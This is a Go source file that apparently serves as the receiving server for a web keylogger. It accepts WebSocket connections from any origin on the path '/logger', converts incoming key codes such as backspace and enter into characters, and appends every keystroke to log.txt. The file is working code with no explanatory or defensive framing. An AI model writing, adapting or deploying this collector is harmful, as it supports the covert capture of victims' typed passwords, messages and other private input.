package main

import (
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{ReadBufferSize: 4, WriteBufferSize: 4}

var (
	lport = "80"
	lpath = "/logger"
)

func main() {
	http.HandleFunc(lpath, Logger)
	http.ListenAndServe(":"+lport, nil)
}

func read(conn *websocket.Conn) {
	for {
		mt, msg, err := conn.ReadMessage()
		if err != nil {
			conn.WriteMessage(mt, []byte("error"))
			return
		}

		msgstr := string(msg)
		if msgstr == "8" {
			msg = []byte("\b")
		}else if msgstr == "13" {
			msg = []byte("\n")
		}

		f, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()
		if err != nil {
			conn.WriteMessage(mt, []byte("error"))
			return
		}
		f.Write(msg)

		err = conn.WriteMessage(mt, []byte("ok"))
		checkerr(err)
	}
}

func Logger(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("New Request : %s\n", r.UserAgent())

	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	ws, err := upgrader.Upgrade(w, r, nil)
	checkerr(err)
	read(ws)
}

func checkerr(err error) {
	if err != nil {
		log.Fatal(err.Error())
	}
}
